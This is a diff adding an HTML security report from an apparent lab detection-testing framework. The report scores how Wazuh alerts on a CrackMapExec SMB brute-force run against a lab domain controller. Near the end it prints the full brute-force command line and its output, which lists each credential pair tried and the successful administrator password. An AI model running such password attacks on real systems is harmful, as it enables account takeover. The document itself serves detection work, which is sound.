@@ -1,0 +1,1099 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>AD SOC Report</title>
+    <style>
+        :root {
+            --page: #FFFFFF;
+            --ink: #111827;
+            --muted: #4B5563;
+            --panel: #FFFFFF;
+            --line: #CBD5E1;
+            --soft-line: #E5E7EB;
+            --header: #111827;
+            --primary: #1D4ED8;
+            --primary-dark: #1E3A8A;
+            --success: #166534;
+            --warning: #92400E;
+            --danger: #991B1B;
+            --code: #F8FAFC;
+        }
+
+        body {
+            background: var(--page);
+            color: var(--ink);
+            font-family: Arial, Helvetica, sans-serif;
+            margin: 0;
+            line-height: 1.5;
+        }
+
+        .container {
+            max-width: 1120px;
+            margin: 0 auto;
+            padding: 30px;
+        }
+
+        .report-header {
+            background: #FFFFFF;
+            color: var(--header);
+            padding: 0 0 16px 0;
+            margin-bottom: 20px;
+            border-bottom: 4px solid var(--primary-dark);
+        }
+
+        .report-header h1 {
+            color: var(--header);
+            margin: 0 0 8px 0;
+            font-size: 27px;
+            letter-spacing: 0;
+        }
+
+        .report-header p {
+            margin: 4px 0;
+            color: var(--muted);
+        }
+
+        .card {
+            background: var(--panel);
+            padding: 18px 0 6px 0;
+            margin-bottom: 18px;
+            border-radius: 0;
+            border: none;
+            border-bottom: 1px solid var(--soft-line);
+            box-shadow: none;
+        }
+
+        h1 {
+            color: var(--header);
+            margin-top: 0;
+        }
+
+        h2 {
+            color: var(--primary-dark);
+            margin: 0 0 10px 0;
+            font-size: 18px;
+            border-bottom: 1px solid var(--soft-line);
+            padding-bottom: 6px;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 10px;
+            table-layout: fixed;
+            font-size: 13px;
+        }
+
+        th {
+            background: #E5E7EB;
+            color: var(--header);
+            padding: 8px;
+            text-align: left;
+            border: 1px solid var(--line);
+        }
+
+        td {
+            padding: 7px;
+            border: 1px solid var(--soft-line);
+            word-wrap: break-word;
+            vertical-align: top;
+            background: #FFFFFF;
+        }
+
+        tr:nth-child(even) td {
+            background: #F8FAFC;
+        }
+
+        .metric {
+            display: inline-block;
+            background: #F8FAFC;
+            border: 1px solid var(--line);
+            color: var(--ink);
+            padding: 10px 14px;
+            margin: 5px 8px 5px 0;
+            border-radius: 4px;
+            min-width: 190px;
+        }
+
+        .ok {
+            color: var(--success);
+            font-weight: 700;
+        }
+
+        .warn {
+            color: var(--warning);
+            font-weight: 700;
+        }
+
+        .bad {
+            color: var(--danger);
+            font-weight: 700;
+        }
+
+        .muted {
+            color: var(--muted);
+        }
+
+        pre {
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            background: var(--code);
+            color: #0F172A;
+            border: 1px solid var(--line);
+            padding: 10px;
+            border-radius: 4px;
+            max-height: 360px;
+            overflow: auto;
+            font-family: Consolas, Cascadia Mono, monospace;
+            font-size: 12px;
+        }
+
+        @media print {
+            body {
+                background: #FFFFFF;
+            }
+
+            .container {
+                max-width: none;
+                padding: 0;
+            }
+
+            .card, .report-header {
+                box-shadow: none;
+                break-inside: avoid;
+            }
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="report-header">
+        <h1>AD Security Report</h1>
+        <p>Cybersecurity Framework Report | Pranav - AD SIEM Framework</p>
+        <p>Generated At: 2026-05-02 13:23:05</p>
+    </div>
+    <div class="card">
+        <h2>Executive Summary</h2>
+        <p>All configured Windows event detections were observed for this attack.</p>
+    </div>
+
+    <div class="card">
+        <h2>Attack Overview</h2>
+        <p><b>Attack Type:</b> SMB Brute Force</p>
+        <p><b>Tool:</b> CrackMapExec</p>
+        <p><b>Category:</b> Credential Attack</p>
+        <p><b>Target:</b> 192.168.56.10</p>
+        <p><b>Duration:</b> 3.31 seconds</p>
+        <p><b>Command Status:</b> Completed</p>
+        <p><b>Exit Status:</b> 0</p>
+    </div>
+
+    <div class="card">
+        <h2>Detection Metrics</h2>
+        <div class="metric"><b>Detection Rate:</b> 100.0%</div>
+        <div class="metric"><b>False Positive Rate:</b> 67.48%</div>
+        <div class="metric"><b>False Negative Rate:</b> 0.0%</div>
+        <div class="metric"><b>Average Delay:</b> 2.0s</div>
+    </div>
+
+    <div class="card">
+        <h2>Detection Summary</h2>
+        <p><b>Expected Events:</b> 1</p>
+        <p><b>Matched Alerts:</b> <span class="ok">1</span></p>
+        <p><b>Missed Events:</b> <span class="bad">0</span></p>
+        <p><b>Unexpected Alerts:</b> <span class="warn">83</span></p>
+    </div>
+
+    <div class="card">
+        <h2>Matched Alerts</h2>
+
+        <table>
+            <tr>
+                <th>Time</th>
+                <th>Windows Event ID</th>
+                <th>Wazuh Rule ID</th>
+                <th>Description</th>
+                <th>Agent</th>
+                <th>Source IP</th>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:22:42</td>
+                <td>4625</td>
+                <td>60122</td>
+                <td>Logon failure - Unknown user or bad password.</td>
+                <td>DC01</td>
+                <td>192.168.56.30</td>
+            </tr>
+
+        </table>
+
+    </div>
+
+    <div class="card">
+        <h2>Missed Events</h2>
+<p class='ok'>No expected Windows events were missed.</p>
+    </div>
+
+    <div class="card">
+        <h2>Unexpected Alerts</h2>
+        <table>
+            <tr>
+                <th>Time</th>
+                <th>Windows Event ID</th>
+                <th>Wazuh Rule ID</th>
+                <th>Description</th>
+                <th>Agent</th>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:17:35</td>
+                <td>4634</td>
+                <td>60137</td>
+                <td>Windows User Logoff.</td>
+                <td>DC01</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:17:46</td>
+                <td>4624</td>
+                <td>60106</td>
+                <td>Windows logon success.</td>
+                <td>DC01</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:17:46</td>
+                <td>4634</td>
+                <td>60137</td>
+                <td>Windows User Logoff.</td>
+                <td>DC01</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:17:57</td>
+                <td>4624</td>
+                <td>60106</td>
+                <td>Windows logon success.</td>
+                <td>DC01</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:18:08</td>
+                <td>4634</td>
+                <td>60137</td>
+                <td>Windows User Logoff.</td>
+                <td>DC01</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:18:46</td>
+                <td>4624</td>
+                <td>60106</td>
+                <td>Windows logon success.</td>
+                <td>DC01</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:18:46</td>
+                <td>4634</td>
+                <td>60137</td>
+                <td>Windows User Logoff.</td>
+                <td>DC01</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:18:46</td>
+                <td>4624</td>
+                <td>60106</td>
+                <td>Windows logon success.</td>
+                <td>DC01</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:18:46</td>
+                <td>4624</td>
+                <td>60106</td>
+                <td>Windows logon success.</td>
+                <td>DC01</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:18:46</td>
+                <td>4624</td>
+                <td>60106</td>
+                <td>Windows logon success.</td>
+                <td>DC01</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:18:47</td>
+                <td>4634</td>
+                <td>60137</td>
+                <td>Windows User Logoff.</td>
+                <td>DC01</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:18:47</td>
+                <td>4634</td>
+                <td>60137</td>
+                <td>Windows User Logoff.</td>
+                <td>DC01</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:18:47</td>
+                <td>4624</td>
+                <td>60106</td>
+                <td>Windows logon success.</td>
+                <td>DC01</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:18:47</td>
+                <td>4634</td>
+                <td>60137</td>
+                <td>Windows User Logoff.</td>
+                <td>DC01</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:18:47</td>
+                <td>4634</td>
+                <td>60137</td>
+                <td>Windows User Logoff.</td>
+                <td>DC01</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:18:47</td>
+                <td>4674</td>
+                <td>60104</td>
+                <td>Windows audit failure event.</td>
+                <td>DC01</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:18:47</td>
+                <td>4674</td>
+                <td>60104</td>
+                <td>Windows audit failure event.</td>
+                <td>DC01</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:18:47</td>
+                <td>4674</td>
+                <td>60104</td>
+                <td>Windows audit failure event.</td>
+                <td>DC01</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:18:47</td>
+                <td>4674</td>
+                <td>60104</td>
+                <td>Windows audit failure event.</td>
+                <td>DC01</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:18:58</td>
+                <td>4634</td>
+                <td>60137</td>
+                <td>Windows User Logoff.</td>
+                <td>DC01</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:19:07</td>
+                <td>4673</td>
+                <td>60107</td>
+                <td>Failed attempt to perform a privileged operation.</td>
+                <td>DC01</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:19:07</td>
+                <td>4624</td>
+                <td>60106</td>
+                <td>Windows logon success.</td>
+                <td>DC01</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:19:09</td>
+                <td>4624</td>
+                <td>60106</td>
+                <td>Windows logon success.</td>
+                <td>DC01</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:19:09</td>
+                <td>4634</td>
+                <td>60137</td>
+                <td>Windows User Logoff.</td>
+                <td>DC01</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:19:10</td>
+                <td>4624</td>
+                <td>60106</td>
+                <td>Windows logon success.</td>
+                <td>DC01</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:19:10</td>
+                <td>4634</td>
+                <td>60137</td>
+                <td>Windows User Logoff.</td>
+                <td>DC01</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:19:46</td>
+                <td>4624</td>
+                <td>60106</td>
+                <td>Windows logon success.</td>
+                <td>DC01</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:19:46</td>
+                <td>4634</td>
+                <td>60137</td>
+                <td>Windows User Logoff.</td>
+                <td>DC01</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:20:03</td>
+                <td>4673</td>
+                <td>60107</td>
+                <td>Failed attempt to perform a privileged operation.</td>
+                <td>DC01</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:20:03</td>
+                <td>4673</td>
+                <td>60107</td>
+                <td>Failed attempt to perform a privileged operation.</td>
+                <td>DC01</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:20:46</td>
+                <td>4624</td>
+                <td>60106</td>
+                <td>Windows logon success.</td>
+                <td>DC01</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:20:46</td>
+                <td>4634</td>
+                <td>60137</td>
+                <td>Windows User Logoff.</td>
+                <td>DC01</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:21:46</td>
+                <td>4624</td>
+                <td>60106</td>
+                <td>Windows logon success.</td>
+                <td>DC01</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:21:46</td>
+                <td>4634</td>
+                <td>60137</td>
+                <td>Windows User Logoff.</td>
+                <td>DC01</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:22:42</td>
+                <td>4624</td>
+                <td>92652</td>
+                <td>Successful Remote Logon Detected - User:\ANONYMOUS LOGON - NTLM authentication, possible pass-the-hash attack.</td>
+                <td>DC01</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:22:42</td>
+                <td>4634</td>
+                <td>60137</td>
+                <td>Windows User Logoff.</td>
+                <td>DC01</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:22:42</td>
+                <td>4776</td>
+                <td>60104</td>
+                <td>Windows audit failure event.</td>
+                <td>DC01</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:22:42</td>
+                <td>4776</td>
+                <td>60104</td>
+                <td>Windows audit failure event.</td>
+                <td>DC01</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:22:42</td>
+                <td>4776</td>
+                <td>60104</td>
+                <td>Windows audit failure event.</td>
+                <td>DC01</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:22:42</td>
+                <td>4776</td>
+                <td>60104</td>
+                <td>Windows audit failure event.</td>
+                <td>DC01</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:22:42</td>
+                <td>4776</td>
+                <td>60104</td>
+                <td>Windows audit failure event.</td>
+                <td>DC01</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:22:42</td>
+                <td>4776</td>
+                <td>60104</td>
+                <td>Windows audit failure event.</td>
+                <td>DC01</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:22:42</td>
+                <td>4776</td>
+                <td>60104</td>
+                <td>Windows audit failure event.</td>
+                <td>DC01</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:22:42</td>
+                <td>4776</td>
+                <td>60104</td>
+                <td>Windows audit failure event.</td>
+                <td>DC01</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:22:42</td>
+                <td>4776</td>
+                <td>60104</td>
+                <td>Windows audit failure event.</td>
+                <td>DC01</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:22:43</td>
+                <td>4776</td>
+                <td>60104</td>
+                <td>Windows audit failure event.</td>
+                <td>DC01</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:22:43</td>
+                <td>4776</td>
+                <td>60104</td>
+                <td>Windows audit failure event.</td>
+                <td>DC01</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:22:43</td>
+                <td>4776</td>
+                <td>60104</td>
+                <td>Windows audit failure event.</td>
+                <td>DC01</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:22:43</td>
+                <td>4776</td>
+                <td>60104</td>
+                <td>Windows audit failure event.</td>
+                <td>DC01</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:22:43</td>
+                <td>4776</td>
+                <td>60104</td>
+                <td>Windows audit failure event.</td>
+                <td>DC01</td>
+            </tr>
+
+        </table>
+    </div>
+
+    <div class="card">
+        <h2>Recommendations</h2>
+<p>All expected AD events were detected for this attack.</p><p>Tune noisy Wazuh rules or narrow the correlation time window.</p>
+    </div>
+
+    <div class="card">
+        <h2>Attack Timeline</h2>
+        <table>
+            <tr>
+                <th>Timestamp</th>
+                <th>Step</th>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:17:35</td>
+                <td>Alert 4634: Windows User Logoff.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:17:46</td>
+                <td>Alert 4624: Windows logon success.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:17:46</td>
+                <td>Alert 4634: Windows User Logoff.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:17:57</td>
+                <td>Alert 4624: Windows logon success.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:18:08</td>
+                <td>Alert 4634: Windows User Logoff.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:18:46</td>
+                <td>Alert 4624: Windows logon success.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:18:46</td>
+                <td>Alert 4634: Windows User Logoff.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:18:46</td>
+                <td>Alert 4624: Windows logon success.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:18:46</td>
+                <td>Alert 4624: Windows logon success.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:18:46</td>
+                <td>Alert 4624: Windows logon success.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:18:47</td>
+                <td>Alert 4634: Windows User Logoff.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:18:47</td>
+                <td>Alert 4634: Windows User Logoff.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:18:47</td>
+                <td>Alert 4624: Windows logon success.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:18:47</td>
+                <td>Alert 4634: Windows User Logoff.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:18:47</td>
+                <td>Alert 4634: Windows User Logoff.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:18:47</td>
+                <td>Alert 4674: Windows audit failure event.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:18:47</td>
+                <td>Alert 4674: Windows audit failure event.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:18:47</td>
+                <td>Alert 4674: Windows audit failure event.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:18:47</td>
+                <td>Alert 4674: Windows audit failure event.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:18:58</td>
+                <td>Alert 4634: Windows User Logoff.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:19:07</td>
+                <td>Alert 4673: Failed attempt to perform a privileged operation.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:19:07</td>
+                <td>Alert 4624: Windows logon success.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:19:09</td>
+                <td>Alert 4624: Windows logon success.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:19:09</td>
+                <td>Alert 4634: Windows User Logoff.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:19:10</td>
+                <td>Alert 4624: Windows logon success.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:19:10</td>
+                <td>Alert 4634: Windows User Logoff.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:19:46</td>
+                <td>Alert 4624: Windows logon success.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:19:46</td>
+                <td>Alert 4634: Windows User Logoff.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:20:03</td>
+                <td>Alert 4673: Failed attempt to perform a privileged operation.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:20:03</td>
+                <td>Alert 4673: Failed attempt to perform a privileged operation.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:20:46</td>
+                <td>Alert 4624: Windows logon success.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:20:46</td>
+                <td>Alert 4634: Windows User Logoff.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:21:46</td>
+                <td>Alert 4624: Windows logon success.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:21:46</td>
+                <td>Alert 4634: Windows User Logoff.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:22:37</td>
+                <td>Attack started</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:22:37</td>
+                <td>Selected attack: SMB Brute Force</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:22:37</td>
+                <td>Tool: CrackMapExec</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:22:37</td>
+                <td>Command execution started</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:22:40</td>
+                <td>Command execution completed</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:22:42</td>
+                <td>Alert 4624: Successful Remote Logon Detected - User:\ANONYMOUS LOGON - NTLM authentication, possible pass-the-hash attack.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:22:42</td>
+                <td>Alert 4634: Windows User Logoff.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:22:42</td>
+                <td>Alert 4776: Windows audit failure event.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:22:42</td>
+                <td>Alert 4625: Logon failure - Unknown user or bad password.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:22:42</td>
+                <td>Alert 4776: Windows audit failure event.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:22:42</td>
+                <td>Alert 4625: Logon failure - Unknown user or bad password.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:22:42</td>
+                <td>Alert 4776: Windows audit failure event.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:22:42</td>
+                <td>Alert 4625: Logon failure - Unknown user or bad password.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:22:42</td>
+                <td>Alert 4776: Windows audit failure event.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:22:42</td>
+                <td>Alert 4625: Logon failure - Unknown user or bad password.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:22:42</td>
+                <td>Alert 4776: Windows audit failure event.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:22:42</td>
+                <td>Alert 4625: Logon failure - Unknown user or bad password.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:22:42</td>
+                <td>Alert 4776: Windows audit failure event.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:22:42</td>
+                <td>Alert 4625: Logon failure - Unknown user or bad password.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:22:42</td>
+                <td>Alert 4776: Windows audit failure event.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:22:42</td>
+                <td>Alert 4625: Logon failure - Unknown user or bad password.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:22:42</td>
+                <td>Alert 4776: Windows audit failure event.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:22:42</td>
+                <td>Alert 4625: Multiple Windows logon failures.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:22:42</td>
+                <td>Alert 4776: Windows audit failure event.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:22:42</td>
+                <td>Alert 4625: Logon failure - Unknown user or bad password.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:22:43</td>
+                <td>Alert 4776: Windows audit failure event.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:22:43</td>
+                <td>Alert 4625: Logon failure - Unknown user or bad password.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:22:43</td>
+                <td>Alert 4776: Windows audit failure event.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:22:43</td>
+                <td>Alert 4625: Logon failure - Unknown user or bad password.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:22:43</td>
+                <td>Alert 4776: Windows audit failure event.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:22:43</td>
+                <td>Alert 4625: Logon failure - Unknown user or bad password.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:22:43</td>
+                <td>Alert 4776: Windows audit failure event.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:22:43</td>
+                <td>Alert 4625: Logon failure - Unknown user or bad password.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:22:43</td>
+                <td>Alert 4776: Windows audit failure event.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:22:43</td>
+                <td>Alert 4625: Logon failure - Unknown user or bad password.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:22:43</td>
+                <td>Alert 4776: Windows audit failure event.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:22:43</td>
+                <td>Alert 4625: Logon failure - Unknown user or bad password.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:22:43</td>
+                <td>Alert 4776: Windows audit failure event.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:22:43</td>
+                <td>Alert 4625: Multiple Windows logon failures.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:22:43</td>
+                <td>Alert 4776: Windows audit failure event.</td>
+            </tr>
+
+            <tr>
+                <td>2026-05-02 13:22:43</td>
+                <td>Alert 4625: Logon failure - Unknown user or bad password.</td>
+            </tr>
+
+        </table>
+    </div>
+
+    <div class="card">
+        <h2>Executed Command</h2>
+        <pre>bash -lc &#x27;if nc -z -w 5 192.168.56.10 445; then crackmapexec smb 192.168.56.10 -u /home/kali/Desktop/attack_lists/users.txt -p /home/kali/Desktop/attack_lists/passwords.txt --continue-on-success; else echo &quot;[PRECHECK_FAILED] SMB port 445 is not reachable on 192.168.56.10&quot;; exit 2; fi&#x27;</pre>
+    </div>
+
+    <div class="card">
+        <h2>Command Output</h2>
+        <pre>SMB         192.168.56.10   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:corp.local) (signing:True) (SMBv1:False)
+SMB         192.168.56.10   445    DC01             [-] corp.local\admin:Admin@1234 STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] corp.local\admin:P@ssw0rd STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] corp.local\admin:Test STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] corp.local\admin:test@1234 STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] corp.local\admin:Pranav STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] corp.local\admin:Soul_Warrior STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] corp.local\test:Admin@1234 STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] corp.local\test:P@ssw0rd STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] corp.local\test:Test STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] corp.local\test:test@1234 STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] corp.local\test:Pranav STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] corp.local\test:Soul_Warrior STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] corp.local\Soul:Admin@1234 STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] corp.local\Soul:P@ssw0rd STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] corp.local\Soul:Test STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] corp.local\Soul:test@1234 STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] corp.local\Soul:Pranav STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] corp.local\Soul:Soul_Warrior STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] corp.local\Warrior:Admin@1234 STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] corp.local\Warrior:P@ssw0rd STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] corp.local\Warrior:Test STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] corp.local\Warrior:test@1234 STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] corp.local\Warrior:Pranav STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] corp.local\Warrior:Soul_Warrior STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] corp.local\Soul_Warrior:Admin@1234 STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] corp.local\Soul_Warrior:P@ssw0rd STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] corp.local\Soul_Warrior:Test STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] corp.local\Soul_Warrior:test@1234 STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] corp.local\Soul_Warrior:Pranav STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] corp.local\Soul_Warrior:Soul_Warrior STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] corp.local\Pranav:Admin@1234 STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] corp.local\Pranav:P@ssw0rd STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] corp.local\Pranav:Test STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] corp.local\Pranav:test@1234 STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] corp.local\Pranav:Pranav STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [+] corp.local\Pranav:Soul_Warrior 
+SMB         192.168.56.10   445    DC01             [-] corp.local\Administrator:Admin@1234 STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] corp.local\Administrator:P@ssw0rd STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] corp.local\Administrator:Test STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] corp.local\Administrator:test@1234 STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [-] corp.local\Administrator:Pranav STATUS_LOGON_FAILURE 
+SMB         192.168.56.10   445    DC01             [+] corp.local\Administrator:Soul_Warrior (Pwn3d!)</pre>
+    </div>
+
+</div>
+</body>
+</html>
